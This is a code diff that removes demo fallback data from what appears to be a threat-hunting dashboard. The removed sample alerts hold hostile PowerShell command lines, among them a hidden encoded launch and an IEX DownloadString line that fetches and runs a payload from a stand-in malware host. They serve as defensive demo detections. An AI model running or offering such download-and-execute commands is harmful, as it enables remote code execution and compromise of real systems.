@@ -121,55 +121,6 @@ LIMIT 200`,
 | LIMIT 200`,
 };
 
-// ─── Demo fallback ────────────────────────────────────────────────────────────
-
-// Deterministic timestamps — no Date.now() to avoid SSR hydration mismatches.
-const DEMO_RESULTS: HuntResult[] = [
-  {
-    id: 'r-001',
-    timestamp: '2026-05-06T11:48:00Z',
-    source: 'crowdstrike',
-    severity: 'high',
-    fields: {
-      host: 'WORKSTATION-042',
-      user: 'john.doe',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
-      'process.parent.name': 'EXCEL.EXE',
-    },
-    highlight: 'powershell.exe -nop -w hidden -enc',
-  },
-  {
-    id: 'r-002',
-    timestamp: '2026-05-06T11:19:00Z',
-    source: 'defender',
-    severity: 'critical',
-    fields: {
-      host: 'SERVER-DC01',
-      user: 'svc_admin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
-      'network.destination.ip': '185.220.101.45',
-    },
-    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
-  },
-  {
-    id: 'r-003',
-    timestamp: '2026-05-06T10:00:00Z',
-    source: 'splunk',
-    severity: 'medium',
-    fields: {
-      host: 'WORKSTATION-019',
-      user: 'maria.lin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
-    },
-  },
-];
-
 const DEMO_SAVED: SavedSearch[] = [
   {
     id: 'demo-1',
